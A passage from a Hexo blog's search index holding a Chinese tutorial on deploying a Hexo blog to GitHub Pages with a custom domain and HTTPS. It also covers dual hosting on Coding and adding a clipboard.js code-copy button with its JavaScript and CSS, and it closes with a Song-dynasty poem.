class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">deploy:</span></span><br><span class=\"line\">\t<span class=\"attr\">type:</span> <span class=\"string\">git</span></span><br><span class=\"line\">\t<span class=\"attr\">repo:</span> <span class=\"string\">https://github.com/yourgithubname/yourgithubname.github.io.git</span></span><br><span class=\"line\">\t<span class=\"attr\">branch:</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n<p>注意在 <code>:</code>  后要添加空格，github 貌似要改 master 分支为 main，到时候可能需要更改配置</p>\n<p>安装 deploy-git，以便将博客部署到 GitHub</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>\n<p>开始部署，更多命令请参考 https://hexo.io/zh-cn/docs/commands</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo d -g  <span class=\"comment\"># d 部署 -g 部署之前预先生成静态文件</span></span><br></pre></td></tr></table></figure>\n<p>成功之后，过一会就可以在 https://yourname.github.io 看到你的博客</p>\n</li>\n<li>\n<p>更改主题，撰写文章</p>\n<p>可以在 https://hexo.io/themes/ 下选择自己喜欢的主题，下载到 <code>themes/</code>  目录下</p>\n<img data-src=\"/git-githubpage/themes-folder.jpg\" class=\"\">\n<p><code>landscape</code>  是默认主题， <code>yilia-plus</code>  是我下载添加的主题，项目地址 https://github.com/JoeyBling/hexo-theme-yilia-plus</p>\n<p>更改 <code>blog/</code>  下的 <code>_config.yml</code></p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">theme:</span> <span class=\"string\">yilia-plus</span></span><br></pre></td></tr></table></figure>\n<p>重新部署即可生效，具体关于主题的各项设置，请参考各个主题的 github 项目说明文档</p>\n<p>开始写文章</p>\n<p>在 <code>source/post</code>  下的添加.md 文件即可，或者</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo new paper</span><br></pre></td></tr></table></figure>\n<p>更多详细操作参考 https://hexo.io/zh-cn/docs/writing 和 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM3NzgxMzA0L2FydGljbGUvZGV0YWlscy84MjcyOTAyOQ==\">https://blog.csdn.net/sinat_37781304/article/details/82729029</span></p>\n<p><em>Tips:  yilia-plus 配置 search 功能，在博客根目录下执行  <code>npm i hexo-generator-json-content --save</code> ， 在 <code>_config.yml</code>  中添加相关配置</em></p>\n</li>\n</ul>\n<h3 id=\"2-设置自定义域名添加https保护\"><a class=\"markdownIt-Anchor\" href=\"#2-设置自定义域名添加https保护\">#</a> 2.  设置自定义域名，添加 https 保护</h3>\n<ul>\n<li>\n<p>设置自定义域名</p>\n<p>在阿里云上购买一个域名，看个人需求，我购买了 snowroll.top 域名 (目前已失效)，主要是便宜 hhhhh。阿里云域名购买及解析教程链接 https://developer.aliyun.com/article/767435</p>\n<p>上面链接的域名操作的 “解析设置” 里，添加一条记录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">记录类型： CNAME  </span><br><span class=\"line\">主机记录： @  </span><br><span class=\"line\">解析线路：默认</span><br><span class=\"line\">记录值： yourname.github.io</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS15b3VybmFtZS1pbTJtajVvbzlicjlpaW5vZjluamtqaDZjODg3Ymt6ZXN6YWhhMjI0NGUzYmc0bTdkdTY4YmthMDkwajdsYnNvcDM0Zy5naXRodWIuaW8=\">这条解析记录应该是将你申请的域名解析关联到 yourname.github.io</span>，再通过 github 自己的 dns 服务器进行解析（个人理解，没有实际抓包看过）</p>\n<p>为了让域名生效，还得在 <code>yourname.github.io</code>  仓库的 setting 中，设置自定义的 Custom domain，示例如下</p>\n<img data-src=\"/git-githubpage/custom-domain.jpg\" class=\"\">\n<p>未添加 https 保护时，图中的 Enforce HTTPS 无法选中，也只能通过 http 访问自定义域名</p>\n<p>为了防止自定义域名失效，在 <code>blog</code>  的 <code>source/</code>  下新建 <code>CNAME</code>  文件，里面填上你的自定义域名即可</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">snowroll.top</span><br></pre></td></tr></table></figure>\n<p>可以重新部署，查看一下自己的域名是否生效（重新部署后，可能需要 1-2 分钟页面才能更新）</p>\n</li>\n<li>\n<p>添加 https 保护</p>\n<p>为了给自定义的域名，也添加 https 保护。我们在阿里云上申请一个免费的证书，教程链接 https://developer.aliyun.com/article/715576</p>\n<p>签发完成并进行完相关的设置后，可能需要 1-2 小时 https 保护才能生效，所以不用过于着急。</p>\n<p>至此，就可以开始愉快的写博客了。</p>\n</li>\n</ul>\n<h3 id=\"3-国内外分流访问\"><a class=\"markdownIt-Anchor\" href=\"#3-国内外分流访问\">#</a> 3. 国内外分流访问</h3>\n<ul>\n<li>\n<p>参考博客： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9hc3VyYWRhLnpvbmUvcG9zdC9EZXBsb3ktSGV4b2Jsb2ctVG8tQ29kaW5nbmV0LUFuZC1HaXRIdWIv\">https://asurada.zone/post/Deploy-Hexoblog-To-Codingnet-And-GitHub/</span></p>\n<p>这篇博客讲解的很全面，按步骤走就可以。其中有些坑，我罗列在下面供大家参考</p>\n<ul>\n<li>\n<p>使用 coding 部署静态网站一直无法认证成功？</p>\n<p>A： 认证的腾讯云必须和 coding 是绑定的关系，实名认证之后才可以</p>\n<img data-src=\"/git-githubpage/static-blog.jpeg\" class=\"\">\n<p>在「个人设置」-「登录密码：前往腾讯云查看并更改」中进行绑定认证</p>\n</li>\n<li>\n<p>上述博客最后有一个 coding 开启 https 的功能，新版申请自定义域名后，证书认证通过后自动为 https，无需强制开启</p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"4-问题汇总及解决\"><a class=\"markdownIt-Anchor\" href=\"#4-问题汇总及解决\">#</a> 4. 问题汇总及解决</h3>\n<ul>\n<li>\n<p>撰写文章，上传到 github 会导致图片丢失，不可见</p>\n<p>解决：</p>\n<ul>\n<li>\n<p>方案 1: 进行文件资源引用，官方文档 https://hexo.io/zh-cn/docs/asset-folders</p>\n</li>\n<li>\n<p>方案 2: 在 <code>source/</code>  下建一个 <code>images</code>  目录，将图片放入其中，文档中图片的引用统一为 <code>![img_alias](/images/test.jpg)</code>  格式</p>\n</li>\n</ul>\n</li>\n<li>\n<p>如何新建文件夹，不止是在 <code>source/_post/</code>  下</p>\n<p>解决： <code>hexo new page test</code>  会生成 <code>source/test/</code>  文件夹，但这个无法再 <code>test</code>  下加其他 md 文件，无法识别</p>\n</li>\n<li>\n<p>如何让点击完之后的网页直接在当前网页跳转，而不是打开多个网页？</p>\n<p>更改主题中_config.yml 中的 open_in_new: 均改为 false 即可</p>\n</li>\n<li>\n<p>添加代码块复制功能</p>\n<p>参考文章 https://codeantenna.com/a/pvakwyOYZ0</p>\n<p>上述文章针对的是 <code>yilia</code>  主题，所以迁移到 <code>yilia-plus</code>  需要做少许改动</p>\n<ul>\n<li>\n<p>利用 js 实现代码拷贝功能</p>\n<p>在 <code>hexo</code>  的根目录 <code>themes\\yilia-plus\\source\\lib</code>  中新建 <code>clipboard_use.js</code> ，如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">&quot;.highlight&quot;</span>).wrap(<span class=\"string\">&quot;&lt;div class=&#x27;code-wrapper&#x27; style=&#x27;position:relative&#x27;&gt;&lt;/div&gt;&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">/*页面载入完成后，创建复制按钮*/</span></span><br><span class=\"line\">!<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e, t, a</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* code */</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> initCopyCode = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> copyHtml = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">        copyHtml += <span class=\"string\">&#x27;&lt;button class=&quot;btn-copy&quot; data-clipboard-snippet=&quot;&quot;&gt;&#x27;</span>;</span><br><span class=\"line\">        copyHtml += <span class=\"string\">&#x27;  &lt;i class=&quot;fa fa-clipboard&quot;&gt;&lt;/i&gt;&lt;span&gt;复制&lt;/span&gt;&#x27;</span>;</span><br><span class=\"line\">        copyHtml += <span class=\"string\">&#x27;&lt;/button&gt;&#x27;</span>;</span><br><span class=\"line\">        $(<span class=\"string\">&quot;.highlight .code&quot;</span>).before(copyHtml);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> clipboard = <span class=\"keyword\">new</span> ClipboardJS(<span class=\"string\">&#x27;.btn-copy&#x27;</span>, &#123;</span><br><span class=\"line\">            target: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">trigger</span>) </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> trigger.nextElementSibling;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        clipboard.on(<span class=\"string\">&#x27;success&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">            e.trigger.innerHTML = <span class=\"string\">&quot;&lt;i class=&#x27;fa fa-clipboard&#x27;&gt;&lt;/i&gt;&lt;span&gt;复制成功&lt;/span&gt;&quot;</span></span><br><span class=\"line\">            <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">                e.trigger.innerHTML = <span class=\"string\">&quot;&lt;i class=&#x27;fa fa-clipboard&#x27;&gt;&lt;/i&gt;&lt;span&gt;复制&lt;/span&gt;&quot;</span></span><br><span class=\"line\">            &#125;, <span class=\"number\">1000</span>)</span><br><span class=\"line\">           </span><br><span class=\"line\">            e.clearSelection();</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        clipboard.on(<span class=\"string\">&#x27;error&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">e</span>) </span>&#123;</span><br><span class=\"line\">            e.trigger.innerHTML = <span class=\"string\">&quot;&lt;i class=&#x27;fa fa-clipboard&#x27;&gt;&lt;/i&gt;&lt;span&gt;复制失败&lt;/span&gt;&quot;</span></span><br><span class=\"line\">            <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">                e.trigger.innerHTML = <span class=\"string\">&quot;&lt;i class=&#x27;fa fa-clipboard&#x27;&gt;&lt;/i&gt;&lt;span&gt;复制&lt;/span&gt;&quot;</span></span><br><span class=\"line\">            &#125;, <span class=\"number\">1000</span>)</span><br><span class=\"line\">            e.clearSelection();</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    initCopyCode();</span><br><span class=\"line\">&#125;(<span class=\"built_in\">window</span>, <span class=\"built_in\">document</span>);</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>引入相关 js 文件</p>\n<p>在 <code>hexo</code>  的根目录下的 <code>themes\\yilia-plus\\layout\\layout.ejs</code>  文件的 <code>&lt;/body&gt;</code>  前引入（不是 <code>&lt;body&gt;</code> ，自己弄的时候犯蠢，结果调试了好久）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 代码块复制功能, 引入jQuery和clipboard --&gt;</span><br><span class=\"line\">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;clipboard@2.0.4&#x2F;dist&#x2F;clipboard.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;https:&#x2F;&#x2F;apps.bdimg.com&#x2F;libs&#x2F;jquery&#x2F;2.1.4&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;&lt;%- url_for(&#39;lib&#x2F;clipboard_use.js&#39;) %&gt;&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>添加样式</p>\n<p>修改 <code>hexo</code>  的根目录下的 <code>themes\\yilia-plus\\source\\main.a5fda8.css</code> ，在末尾添加以下样式</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.btn-copy</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: inline-block;</span><br><span class=\"line\">    <span class=\"attribute\">cursor</span>: pointer;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#eee</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background-image</span>: <span class=\"built_in\">linear-gradient</span>(<span class=\"number\">#fcfcfc</span>, <span class=\"number\">#eee</span>);</span><br><span class=\"line\">    <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid <span class=\"number\">#d5d5d5</span>;</span><br><span class=\"line\">    <span class=\"attribute\">border-radius</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">    -webkit-user-select: none;</span><br><span class=\"line\">    -moz-user-select: none;</span><br><span class=\"line\">    -ms-user-select: none;</span><br><span class=\"line\">    user-select: none;</span><br><span class=\"line\">    -webkit-appearance: none;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">13px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-weight</span>: <span class=\"number\">700</span>;</span><br><span class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">20px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">    -webkit-<span class=\"attribute\">transition</span>: opacity .<span class=\"number\">3s</span> ease-in-out;</span><br><span class=\"line\">    -o-<span class=\"attribute\">transition</span>: opacity .<span class=\"number\">3s</span> ease-in-out;</span><br><span class=\"line\">    <span class=\"attribute\">transition</span>: opacity .<span class=\"number\">3s</span> ease-in-out;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>: <span class=\"number\">2px</span> <span class=\"number\">6px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: absolute;</span><br><span class=\"line\">    <span class=\"attribute\">right</span>: <span class=\"number\">5px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">top</span>: <span class=\"number\">5px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">opacity</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.btn-copy</span> <span class=\"selector-tag\">span</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: <span class=\"number\">5px</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.code-wrapper</span><span class=\"selector-pseudo\">:hover</span> <span class=\"selector-class\">.btn-copy</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">opacity</span>: <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n<center>鹊桥仙·纤云弄巧\n</center>\n<center>宋·秦观\n<center>纤云弄巧，飞星传恨，银汉迢迢暗度。金风玉露一相逢，便胜却人间无数。\n<center>柔情似水，佳期如梦，忍顾鹊桥归路。两情若是久长时，又岂在朝朝暮暮。",
            "tags": [
                "github page"
            ]
        }
    ]
}